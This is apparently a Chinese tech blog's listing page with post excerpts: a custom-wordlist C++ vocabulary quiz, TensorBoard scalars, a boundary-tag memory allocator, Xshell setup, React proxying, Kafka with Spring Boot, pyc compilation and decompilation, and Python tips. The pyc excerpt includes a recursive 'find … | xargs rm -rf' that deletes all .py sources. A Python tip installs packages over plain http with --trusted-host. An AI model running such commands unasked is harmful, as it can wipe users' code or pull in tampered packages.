如今市面上的记单词app都是规定词库，有时候不能满足我们通常记忆单词的需求，比如我们记忆针对性单词，比较难记忆的单词，记完了需要复习的单词，在市面上的app无法添加自己的词库，都得按照导入的单词数书从头开始记忆，而本人写这个小程序的目的，也就是本程序的特点:“可设置自定义单词库！可设置自定义单词库！可设置自定义单词库！重要的事情说三遍”，除此之外还可以满足我们记单词过程中的多种需求，而且操作简洁，十分适用于天天在死啃单词小伙伴！！！
本人就是天天死啃单词一党，记单词突发奇想创造了这个程序
话不多说！！！开始出使用教程（代码最后会附上） 使用十分方便简单也是本程序一大特点，所以不用担心会麻烦，而且词库是永久性的，一次导入，终身使用，所以也需要担心单词会丢失的问题
顺便提一句担心会有没有写过C的萌新，附上编译器下载地址：Dev-cpp5.4.0
一、创建自己的词库 1.创建文件
在电脑上建立一个新文件，编译运行代码的路径选择到这个文件夹即可
（我在桌面上建立了文件）
2.运行代码
拷贝我的代码到编译器中编译运行即可，注意编译运行的代码存放路径放入刚才创建的文件下
运行后将出现菜单页面
3.创建词库
注意：词库会在自己添加第一个单词时会自动创建，但一旦创建就永久存在
输入1→输入单词
单词随意输入多少个都没问题，输入m退出添加单词
出现以下页面表示添加成功，按回车返回菜单
菜单栏下输入6可以看见刚才添加进词库的单词
打开刚才创建的文件也可以看到词库
打开词库文件
以后想添加删除更新词库单词也直接在这里修改，但是注意不要出现多余的回车，修改结束后要保证光标停留在最后一个单词的末尾,也可以直接在程序中和刚才一样进行添加
二、功能介绍 1.添加新单词
可以在外部词库txt文件中添加，也可以输入1在程序中添加，添加的单词会自动永久保存到词库中
2.默写中文
会根据词库随机抽取单词进行中文提问，输入答案之后会自动评测，打分
3.默写英文
会根据词库随机抽取单词进行英文提问，输入答案之后会自动评测，打分
4.根据中文选择英文
会根据词库随机抽取四个单词组成选项ABCD，并进行英文提问，选择选项之后会自动评测，打分（此功能词库最少需要有四个单词）
5.根据英文选择中文
会根据词库随机抽取四个单词组成选项ABCD，并进行中文提问，选择选项之后会自动评测，打分（此功能词库最少需要有四个单词）
6.查看词库列表
可以查看词库单词、单词个数
7.查找单词
可以根据需求对词库单词进行查找，输入中文可查英文，输入英文可查中文难
8.当天复习
录入当天所记词汇，进行复习检测，错误三次单词将自动录入词库
三、其他操作说明 1.输入m键返回菜单
2.输入q键退出
3.回车键下一题或者返回上一步或者返回菜单
4.操作过程中会进行自动记分
5.详细见程序的帮助
四、后期使用 程序运行一次之后，不需要再打开源程序运行，直接打开文件中的.exe文件进行操作即可，更加便捷
注意：若出现异常，请重启打开窗口
五、代码 /* 项目名：轻松记单词 项目时间：2020年7月11日 项目人：Knock man 项目背景：目前市面上的记单词软件无法添加自己的词库，根据词库需求记忆， 本程序就是实现自己设置词库，程序随机考察词库内的单词的功能，协助单词记忆 还提供当天单词复习功能 操作说明：见程序帮助部分 */ #include&lt;iostream&gt; #include&lt;algorithm&gt; #include&lt;ctime&gt; #include&lt;string&gt; #include&lt;cstdio&gt; #include&lt;map&gt; #include&lt;cstring&gt; #include&lt;cstdlib&gt; #include&lt;set&gt; #include&lt;fstream&gt; using namespace std; const int M=9999999; int choose,wordnumber=0,mark=1,score=0; map&lt;string,string&gt; English; map&lt;string,string&gt; chinese; struct Node{ string wEnglish; string wchinese; }; Node words[M]; //菜单 void list(){ system("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8fbdae804f363c0c6a1014064234572/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e2592884025ec703a6fe665e874186e/" rel="bookmark">
			PyTorch 使用 TensorBoard 中的 writer.add_scalar 与 writer.add_scalars 的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		writer.add_scalar() 功能：将标量添加到 summary参数： tag (string)：数据标识符scalar_value (float or string/blobname)：要保存的数值global_step (int)：全局步值walltime (float)：可选参数，用于记录发生的时间，默认为 time.time() writer.add_scalars() 功能：添加多个标量数据到 summary 中参数： main_tag (string)：tag 的父级名称tag_scalar_dict (dict)：保存 tag 及相应的值的键值对global_step (int)：全局步值walltime (float) 可选参数，可选参数，用于记录发生的时间，默认为 time.time() 两者区别 writer.add_scalar() 添加一个标量到 summarywriter.add_scalars() 可以同时添加多个标量到 summary 中，多个标量需要使用键值对的形式输入 两种共同点 第一个参数可简单理解为保存到 tensorboard 日志文件中的标量图像的名称第二个参数可简单理解为图像的 y 轴数据第三个参数可简单理解为图像的 x 轴数据第四个参数都是可选参数，用于记录发生的时间，默认为 time.time() 实例 import numpy as np from torch.utils.tensorboard import SummaryWriter # 也可以使用 tensorboardX # from tensorboardX import SummaryWriter # 也可以使用 pytorch 集成的 tensorboard writer = SummaryWriter() for epoch in range(100): writer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e2592884025ec703a6fe665e874186e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/802a1af110ad23999e5d49ea146953ed/" rel="bookmark">
			C语言之内存动态管理(边界标识法)源码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 概述.... 3
2 背景.... 3
3 工作机制.... 3
4 分配机制特点.... 3
5 应用场景.... 3
6 源码文件.... 4
6.1 MemAlloc.h. 4
6.2 MemAlloc.cpp. 4
7 数组接口函数使用说明.... 16
7.1 CreateHeap(). 16
7.2 DestroyHeap (). 17
7.3 AllocMem(). 17
7.4 FreeMem(). 18
8 demo.. 19
概述 本文讲述一种的内存动态管理机制：边界标识法。关于边界标识法大家有兴趣的话可以阅读清华计算机教材《数据结构》(作者：严蔚敏、吴伟民)第八章(动态存储管理)中第3节(边界标识法)。本文主要是针对从事后台服务器程序领域讲述这种内存分配机制的应用场景和优缺点。
2.背景
本文提出的内存分配管理策略是对清华计算机教材《数据结构》(作者：严蔚敏、吴伟民)第八章(动态存储管理)中第3节(边界标识法)示例代码的整理和封装。
3. 工作机制
应用程序首先调用mallo()函数预先分配出一块内存空间，然后在这个内存空间中使用边界标识法分配出应用程序需要的内存，内存释放时，会自动合并前后紧邻的空闲块，形成更大的空闲块。
4. 分配机制特点
该机制优点是：
可以根据需要分配任意大小的空间，不需要取整。释放内存操作极快。 该机制缺点是：
1、长时间运行可能会产生大量碎片，导致内存分配的效率降低和内存的浪费。
应用场景 针对服务器程序应用场景：
1、需要连续内存空间。
2、分配内存大小范围大，从1个字节到上兆、几十兆。
3、分配的空间只是临时使用，用完就释放，不至于产生大量碎片。
另外：如果设计的软件对性能要求不高，也可以考虑使用此种内存分配机制。
5. 源码文件
5.1 MemAlloc.h
#ifndef MEMALLOC_H #define MEMALLOC_H typedef void* HANDLE; HANDLE CreateHeap(int nHeapSize); void DestroyHeap(HANDLE hHeap); void* AllocMem(HANDLE hHeap, int nSize); void FreeMem(HANDLE hHeap, void* pAddr); int GetAddrSize(void* pAddr); void FreeAllMem(HANDLE hHeap); #endif 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/802a1af110ad23999e5d49ea146953ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cbeedcd8339bced5f1cf532a001bd0e/" rel="bookmark">
			虚幻4敌人受伤并被击退的逻辑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		话不多说上代码:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f0a3c9e82a0b3d0b06a3ad80a4908fb/" rel="bookmark">
			c语言开发之广义巨型数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 概述.... 3
2 背景.... 3
3 传统数组(静态数组).. 3
4 动态数组.... 4
5 广义巨型数组.... 5
5.1 技术特点... 5
5.1 应用场景... 5
6 源码文件.... 6
6.1 HugeArray.h. 6
6.2 HugeArray.cpp. 7
7 数组接口函数使用说明.... 13
7.1 CreateHugeArray(). 13
7.2 DeleteHugeArray(). 14
7.3 HAGetAddrByIndex(). 15
概述 本文讲述广义巨型数组提出的背景，已经传统意义上的静态和动态数组的优缺点以及使用上的限制。同时阐述了巨型数组的技术特点和应用场景。最后作者把巨型数组的实现源码和接口使用说明及调用实例代码附上。
说明：本文提到的数组都是一维数组，不涉及到多维数组。
背景 作者在某软件项目中，需要用到巨型数组，用来存储超过上千万乃至上亿的指针，因为只需要根据索引下标进行访问，利用数组可以连续存放数据，大大节省内存，通过下标可以访问到数据。但是传统意义上的数组，受限于栈(stack)空间和堆(stack)空间的限制无法满足业务需求。所以作者设计广义上的数组概念，用来支持超大巨型数组。
传统数组(静态数组) C语言数组定义如下:
1、数组是相同数据类型的元素的集合。
2、数组中的各元素的存储按先后顺序连续存放。
3、数组元素用整个数组的名字和它自己在数组中的顺序位置来表示。例如：a[0]表示
名字为a的数组中的第一个元素，a[1]代表数组a的第二个元素，以此类推。
示例如下：
int a[5]; a[0] = 10; a[1] = 11; a[2] = 12; a[3] = 13; a[4] = 14; int i; for(i = 0; i &lt; 4, i++) { printf(“%d\r\n”, i); } 静态数组的限制：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f0a3c9e82a0b3d0b06a3ad80a4908fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41f22842bee7dd2b10497abf894d0c5a/" rel="bookmark">
			Matlab:etime()函数的介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 分别计算训练消耗时间和测试消耗时间：
c1 = clock; [mInf.projectedTrain, mInf.predictedTrain] = obj.fit(train,param); % Save the model type obj.model.algorithm = class(obj); c2 = clock; mInf.trainTime = etime(c2,c1); c1 = clock; [mInf.projectedTest, mInf.predictedTest] = obj.predict(test.patterns); c2 = clock; mInf.testTime = etime(c2,c1); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed893df2234776b8cbbcb9582e2a7186/" rel="bookmark">
			免费Xshell、Xftp下载、安装、连接教程【图文】详细
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、下载二、安装三、连接服务器 首先推荐一款，某一些功能界面多样性，数据可视化程度比Xshell还要好的远程连接工具finalShell
推荐理由：下载简单、可视化程度更高比较适合新手、还有其他高级功能比如说默认就可以放你运行的程序在后端运行…
finalShell官网下载地址(各个操作系统都有）：http://www.hostbuf.com/t/988.html
假如你还是要下载XShell，那么好跟着我往下操作就行。
XShell免费官方网站下载地址：https://www.netsarang.com/zh/all-downloads/
注意：其实只需要下载XShell，Xftp下载不下载就行(用于可视化上传文件)，可以使用Linux命令中的rz和 sz命令来实现文件的上传与下载，还可以直接把文件拖拽到XShell窗口中实现上传文件到Liunx服务器。
也可以在我百度网盘里免费获取Xshell7 和 Xftp7 的安装包
链接：https://pan.baidu.com/s/1SaofwFTGMqXeD2XcwbY9NA
提取码：uuuu
一、下载 1、进入切换为中文–&gt;点击下载（任意一个都可以）；
2、点击免费授权页面；
3、填写一个有效邮箱，一会接受邮箱（会发送一个网站给你）；
4、打开你接收到的网址；
5、点击begin downloading 下载即可；
6、我用的是迅雷，你没用的话在浏览器下载即可。
二、安装 1、双击安装
2、点击是–&gt;下一步
3、一直下一步就好了
注意：这里选择安装目录时，一定要先在指定目录下创建存放Xftp或者Xshell的目录，它默认不会创建新的目录来存放相应的文件。
三、连接服务器 1、安装完成之后就会自动弹出xftp的页面；
2、填写信息，连接服务器
3、连接成功。
好喽，以上就是XFTP的下载安装连接，Xshell下载安装连接类似。
当你安装完成这两个工具之后就可以对页面进行自定义设置，比如有的栏位很大，也没有必要现在出来，这样就会让命令行显示区域很小，所以建议关闭掉一些没有必要显示的栏位。
设置操作：点击菜单栏的"查看"选择，里面有一个叫做工具栏的够不勾选即可。
假如关闭了菜单栏，要打开"查看"选项，直接右键页面最上方。
最后，假如要对服务器某些文件进行简单的操作或者要将IDEA中的某些文件上传到远程服务器上时：
你完全可以直接使用 IDEA 开发工具连接直接操作服务器上的文件即可，操作十分简单。
IDEA工具连接远程服务器主机快速操作与上传文件
完结！
有用点个关注，手留余香！😗 😗 😗
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b82589dffddeb0c106138cba5de2f78b/" rel="bookmark">
			最新React使用 http-proxy-middleware解决多跨域问题(完美篇)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装 http-proxy-middleware npm install http-proxy-middleware #顺便安装一下 axios ，不用也可以，用fetch也一样。 npm install axios 2. src目录下创建一个 setupProxy.js文件 里面的'api'代表target的域名url代理后的url
const { createProxyMiddleware } = require('http-proxy-middleware'); module.exports = function (app) { app.use( '/api', createProxyMiddleware({ target: 'https://eyesight.news.qq.com/', changeOrigin: true, pathRewrite: { '^/api': '', } }) ); app.use( '/apc', createProxyMiddleware({ target: 'https://api.inews.qq.com/', changeOrigin: true, pathRewrite: { '^/apc': '', } }) ); }; 3. 发送axious请求 getData() { // 开启loading特效 const instance = axios.create({ baseURL: '/api/sars/toheros', timeout: 3000, headers: { 'Content-Type': 'application/json' } }); return new Promise((resolve, reject) =&gt; { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b82589dffddeb0c106138cba5de2f78b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e93683e983b5ead4246b0a899818fa64/" rel="bookmark">
			springboot2.x整合kafka【详细】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、中间件部署1. 环境2. 版本选择依据3. 解压安装3.1 zookeeper安装部署3.2 kafka安装部署 二、springboot整合1. pom.xml添加依赖2. application.yml添加kafka配置3. service下创建kafka文件夹，新建生产者4. service.kafka文件夹下，新建消费者5. 测试 一、中间件部署 1. 环境 服务器系统版本：CentOS 7.3.1611zookeeper使用版本：zookeeper-3.4.14kafka使用版本：kafka_2.12-2.3.1 2. 版本选择依据 kafka-zookeeper对应版本（最新可参考官网：http://kafka.apache.org/downloads）：
springboot-kafka客户端对应版本（https://spring.io/projects/spring-kafka）：
下载地址（多个镜像仓库可选）：https://www.apache.org/dyn/closer.cgi?path=/kafka/2.3.1/kafka_2.12-2.3.1.tgz
3. 解压安装 3.1 zookeeper安装部署 下载并拷贝zookeeper-3.4.14.tar.gz文件到指定目录下（下面假设安装在/home/tools下）
解压、进入到/home/tools目录执行命令：tar -xvf zookeeper-3.4.14.tar.gz
解压完成后，cd /home/tools/zookeeper-3.4.14/conf
拷贝文件、执行命令：cp zoo_sample.cfg zoo.cfg
创建数据文件夹/data/dataDir和日志文件夹/data/dataLogDir
cd /home/tools/zookeeper-3.4.14/ mkdir /data mkdir /data/dataDir mkdir /data/dataLogDir 编辑zoo.cfg文件，修改dataDir和dataLogDir的路径
启动zookeeper
执行命令：/home/tools/zookeeper-3.4.14/bin/zkServer.sh start
扩展：方便起见，为zookeeper设置启动脚本
进入到/etc/rc.d/init.d目录下： cd /etc/rc.d/init.d新建一个名为zookeeper的文件： touch zookeeper修改zookeeper内容: vim zookeeper
注意文件中JAVA_HOME每个机子配置不同，查询命令：echo $JAVA_HOME#!/bin/bash #chkconfig: 2345 10 90 #description: service zookeeper export JAVA_HOME=/usr/java/jdk1.8.0_181 export ZOOKEEPER_HOME=/home/tools/zookeeper-3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e93683e983b5ead4246b0a899818fa64/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5902c3a68a6d24be94630ffa418476f8/" rel="bookmark">
			python文件编译与pyc反编译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pyc是编译py之后生成的二进制文件。当我们发布系统的时候不想让别人看到源代码，就需要将py文件编译生成pyc文件，对外只提供pyc文件。同样，如果拿到一个python程序，只有pyc文件，我们就无法看到源码，希望有办法反编译pyc文件以获得源码。
既然有反编译的需求，为了保护pyc文件不被反编译，我们又希望找到一个方法来防止pyc文件被反编译。
本文介绍了如何将py文件编译成pyc和pyo文件，也介绍了如何反编译pyc文件， 又给出了一种字节码混淆方法来防止pyc文件被反编译。
1 编译py文件到pyc和pyo pyc是编译py之后生成的二进制文件，由python虚拟机来执行的。当我们发布系统的时候不想让别人看到源代码，就需要将py文件编译生成pyc文件，对外只提供pyc文件。
同时，在模块被加载时，.pyc文件比.py文件更快
但是pyc的内容跟python的版本相关，不同的版本编译后的pyc文件不同，2.5编译的pyc文件不能到3.5上执行.
发布python软件的过程为：
1. 生产pyc文件: python -m compileall . 2. 删除py文件: find . -name “*.py” |xargs rm -rf 3. 删除pycache目录: find . -name “pycache” |xargs rm -rf
1.1 Python2 编译 命令：
python -m py_compile file.py
python -m py_compile {file1,file2}.py
编译完成后，生成的 .pyc文件在当前目录。
可以使用-O或者-OO转换python命令来减少编译模块的大小
-O转换会帮你去掉assert语句
-OO转换会帮你去掉assert语句和__doc__文档字符串
由于一些程序可能依赖于assert语句或文档字符串，应该在确认需要的情况下使用这些选项。
例如 python –O -m py_compile file.py 会在本目录生成 file.pyo
1.2 python3 编译 Python3的编译和python2一样，只是在python3之后编译后的文件在pycache目录下，而不是与源文件同一目录。
那么如何让python3实现生成的pyc与源代码在同一目录呢？可以加上-b参数，例如
Python3 -m py_compile -b file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5902c3a68a6d24be94630ffa418476f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b226831282310b959ef4fcc06b786904/" rel="bookmark">
			Python使用中常见问题总结（五）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		尊敬的读者您好：笔者很高兴自己的文章能被阅读，但原创与编辑均不易，所以转载请必须注明本文出处并附上本文地址超链接以及博主博客地址：https://blog.csdn.net/vensmallzeng。若觉得本文对您有益处还请帮忙点个赞鼓励一下，笔者在此感谢每一位读者，如需联系笔者，请记下邮箱：zengzenghe@gmail.com，谢谢合作！
1、当Python三方库装不上时用或者安装速度过慢，可以考虑用镜像：
① pip install urllib.request-i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com
pip install 包名-i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com
② pip install -i https://pypi.tuna.tsinghua.edu.cn/simple scikit-learn==0.23.1
2、txt文件前方有0的字段，导入中途岛后失去了0
df = pd.read_csv("../consume_level/consume_data/city_hotel_consumption_interval.txt", sep='\001', header=None, low_memory=False, converters = {1: str})
3、当scp不能使用时，需要在本地启动ssh服务：
sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist
4、查看python本地版本，并设置本地版本
pyenv versions：查看python所有版本
pyenv local：查看python本地版本
pyenv local 3.6：将python本地版本设置为3.6
5、如果安装了某库，但还在报没库的错误，请检查库的版本是否需要更新
6、Python获取时、分、秒并比较大小
d1 = now.strftime('%H:%M:%S') d2 = datetime.datetime.strptime('06:00:00', '%H:%M:%S') d3 = datetime.datetime.strptime('22:59:59', '%H:%M:%S') #当d1介于d2和d3之间时，发出报警消息 if d1 &gt;= d2 and d1 &lt;= d3: if today_ratio &lt;= 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b226831282310b959ef4fcc06b786904/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/473e511a331e5c23dc85510ef6333c07/" rel="bookmark">
			jvm与非jvm语言优劣_引入新的JVM语言Concurnas
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jvm与非jvm语言优劣
什么是Concurnas，它与众不同的地方是什么？ Concurnas是一种新的通用开源JVM编程语言，旨在用于构建并发，分布式和并行系统。 Concurnas很容易学习； 它提供了令人难以置信的性能以及用于构建现代企业级计算机软​​件的许多功能。 Concurnas与现有编程语言的不同之处在于，它提供了一种独特的，简化的执行并发，分布式和并行计算的方式。 这些计算形式是现代软件工程中最具挑战性的一些形式，但是使用Concurnas可以使它们变得容易。 利用Concurnas来构建软件，使开发人员能够轻松可靠地实现当今多核计算机提供的全部计算能力，从而使他们能够编写更好的软件并提高生产率。 在本文中，我们将了解Concurnas的一些关键功能，这些功能通过构建供金融公司使用的交易应用程序的关键组件而使其独一无二。 Concurnas的主要目标 创建Concurnas时要牢记五个主要目标： 提供动态类型语言的语法以及强类型编译语言的类型安全性和性能。 具有可选类型和可选的简洁程度，并具有编译时错误检查功能。 通过提供一种编程模型，可以简化并发编程，该模型对于非软件工程师而言比传统的线程和锁模型更为直观。 为了使研究人员和从业人员都能够提高工作效率，使想法可以从理想化一直到使用相同语言和相同代码进行生产。 结合并支持软件工程的现代趋势，包括无效安全性，特征，模式匹配和对依赖注入，分布式计算和GPU计算的一流公民支持。 通过支持领域特定语言的实现并通过将其他语言嵌入到Concurnas代码中来促进将来的编程语言开发。 Concurnas简介 基本语法 让我们首先从一些基本语法开始。 Concurnas是一种类型推断语言，具有可选类型： myInt = 99myDouble double = 99.9 //here we choose to be explicit about the type of myDoublemyString = "hello " + " world!"//inferred as a Stringval cannotReassign = 3.2fcannotReassign = 7.6 //not ok, compilation erroranArray = [1 2 3 4 5 6 7 8 9 10]aList = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]aMatrix = [1 2 3 ; 4 5 6 ; 7 8 9] 导入代码 由于Concurnas在JVM上运行并且与Java兼容，因此我们可以访问现有的大型库库，这些库可用于Java，JDK，当然还有我们所运营的企业已经在任何版本中创建的任何软件。 JVM语言（例如Scala，Kotlin等）。 我们可以通过熟悉的机制导入代码： from java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/473e511a331e5c23dc85510ef6333c07/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7785f071c904658d4f5d45307e1b520d/" rel="bookmark">
			java1!&#43;2!&#43;3!_到Java辉煌的25年！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java1!+2!+3!
1995年，Java首次公开实现。 它最初的概念是帮助新的和改进的电视遥控器（如果您愿意的话，可以是家庭娱乐控制器），而业界对此并不满意。 不久，Java在桌面计算的应用程序开发中立足。 随着Internet的出现，Java成为了Web应用程序的事实上的语言。 它是互联网时代软件历史上的一支变革力量。 之所以如此，有两个原因： 它的简洁性，面向对象的特性，内置的库，运行时错误检测等使企业应用程序编程比C，COBOL等可用的替代方法更快，更容易。 它以“一次编写，随处运行”的承诺交付，具有完全的平台独立性，与操作系统无关的Java虚拟机（JVM），对Internet协议（如http / ftp等）的支持。 还请参见： Deno 1.0 –“ Deno是用于命令行脚本的Web浏览器” 结果，它很快就影响了企业工作负载和应用服务器的构建方式，从而满足了它们对可伸缩性，安全性和可靠性等方面的需求。2006年，该语言正式为社区开放源代码，从而推动了大规模采用和开发。贡献。 同时，它也推动了我们今天遇到的移动技术现象。 Symbian OS是早期的移动操作系统之一，它支持Java，为当时的一些移动应用程序和游戏提供了支持。 随着移动技术的发展，Android本身和大部分Android应用程序的很大一部分都使用Java构建。 实际上，直到2017年，它才是首选的Android应用程序开发语言。 今天，它仍然是前三名。 如果Java失去了赞助人，那么Android会给它带来急需的推动力。 25年后，超过900万开发人员，Java仍然是全世界最流行，最常用和备受推崇的通用编程语言之一。 在开发人员向GitHub存储库贡献的390种语言中，Java位居第三，仅在今年就被Python排名超过了它十年来的第二位。 仅由于其多功能性和范围，该语言的受欢迎程度和采用率仍然很高。 以下是几种影响当前和未来技术的方式： 在云上启用应用程序。 这不仅意味着构建新的云原生应用程序，还意味着使用于云环境的现有企业应用程序现代化。 Java具有“一次编写，随处运行”功能，可确保应用程序在多云环境，容器化应用程序，跨平台应用程序等上运行 。 企业应用程序的骨干。 研究表明，Java仍然是企业应用程序开发领域中的顶级语言。 对于跨企业工作负载的服务器端应用程序尤其如此。 实际上， 一些世界上访问量最大的网站，例如Google，Facebook，Twitter，YouTube和Amazon，都使用Java进行后端编程，这是他们技术堆栈中仅有的几种语言之一。 连接物联网。 一些IoT应用程序 （包括可穿戴技术应用程序）正在Java上构建。 现有的跨平台应用程序生态系统，便捷的可移植性和互操作性正鼓励开发人员在Java上构建IoT应用程序，更不用说连接全球众多设备所需的平台独立性了。 推动数据革命 《 Oracle Java杂志》总编辑安德鲁·宾斯托克（Andrew Binstock ）在《福布斯 》上写道： “大数据革命主要是Java现象。” 我们不能不同意像Hadoop这样的框架主要是用Java编写的语言，而像Scala这样的语言可以与之互操作。 不管它是否引发了大数据革命，它一直在推动着很大一部分数据和分析项目的发展。 尽管Python和R逐渐成为分析和大数据应用程序的顶级编程语言，但熟悉Java的程序员发现将其技能应用于新应用程序更加简单。 还请参见： Python开发人员调查：84％的人使用Python作为主要语言 带动世界 就像我之前提到的，许多Android开发人员都使用Java作为其编程语言。 尽管Kotlin的发展缓慢，但精通Java技能的开发人员不太可能很快改变。 而且，他们拥有一个充满活力的协作社区可以帮助他们。 当我们环顾开发人员社区时，毫无疑问Java开发人员的机会很多。 它是最难找到的顶级技能之一。 英国最近的一项研究发现了这一点。 领英经济图论坛（LinkedIn Economic Graph Forum）发现，在美国也是如此。 企业中的传统Java团队正在学习新技能和采用新方法进行应用程序开发的道路上。 如今，已经有了基于开放标准和框架的企业级低代码平台，这些平台使专业Java开发人员可以快速地进行全栈学习并提高技能。 无论您是对现有应用程序进行现代化改造还是构建新应用程序，它们都可以在应用程序开发和交付生命周期中补充Java编码。 在过去，我们已经看到该语言在互联网泡沫的兴起和移动时代等多个阶段中脱颖而出。 在当今精益团队和快速交付的时代，我们期待Java重新发明自己，以帮助世界各地的开发人员从想法中加速应用程序！ Java成立25周年快乐！ 翻译自: https://jaxenter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7785f071c904658d4f5d45307e1b520d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3aa12564fe19078c7ed4c3bbe4a68c11/" rel="bookmark">
			Quarkus 1.5.0.Final欢迎新的扩展
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Quarkus的另一个版本已经发布，可以下载了。 Quarkus 1.5.0.Final于2020年6月3日发布。它包括许多新更新，新扩展，以及通常的错误修复和一些性能改进。 什么是Quarkus ？ 它是由Red Hat赞助的，是“为OpenJDK HotSpot和GraalVM量身定制的Kubernetes本机Java堆栈，它是根据最佳的Java库和标准精制而成的”。 跟上Quarkus； 让我们仔细研究一下超音速亚原子Java的新功能。 还请参见： Java 16：向Git和GitHub的迁移越来越紧密 Quarkus 1.5 包括在新版本中： 对Picocli的支持：创建丰富的命令行应用程序，这些应用程序在具有Picocli扩展名的JVM上运行。 此功能目前处于实验阶段。 gRPC支持：使用gRPC编写客户端和服务。 您可以使用Maven或Gradle进行配置。 MicroProfile GraphQL扩展 Amazon服务支持：已为Amazon DynamoDB，Amazon KMS，Amazon S3，Amazon SES，Amazon SNS和Amazon SQS添加。 具有Panache扩展功能的Hibernate ORM REST数据：请参阅该指南，并了解此实验功能如何简化基于JAX-RS和Hibernate ORM的CRUD REST API。 支持Spring Cache注释和新文档 Blaze Persistence扩展 支持@InjectSpy 新的文档更新： Amazon Lambda，固定的Quartz文档格式，“添加凭证提供程序”，以及为所有新扩展添加的文档。 修复程序：修复了多个Mongo测试失败，IDE中运行测试的问题，在Amazon Lambda Test Framework关闭期间改进了错误处理。 在GitHub上查看完整的1.5.0.Final更新日志 。 快速包装格式 此版本的主要亮点之一是新添加的快速罐包装格式。 根据公告博客，此新格式将使启动时间更快，并且是默认jar包装格式的新替代方法。 Quarkus用户应注意，此格式可能在将来的添加中成为标准格式。 建议您熟悉新格式并在此之前向开发团队提供反馈。 进行切换 您是否尝试过使用Quarkus？ 它正在企业中立足。最近，咨询公司Sedona使用Quarkus重新编写了其保险费精算引擎。 在此处了解他们的旅程，并查看此开关提供的好处。 根据博客所述，切换的五个主要原因是： Quarkus采用容器优先的方法 它是Kubernetes原生的 它具有快速的启动时间 它消耗很少的内存 现场编码 还请参见： Java开发人员对BDA的介绍 新手可以参考入门指南以获取更多信息。 您将需要JDK 8或11 +，IDE和Gradle或Apache Maven 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3aa12564fe19078c7ed4c3bbe4a68c11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/209567a3e51e3057c53f592b9879bd87/" rel="bookmark">
			泛克里金和普通克里金_避免敌人！ 这是用克里制作的简单游戏。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		泛克里金和普通克里金
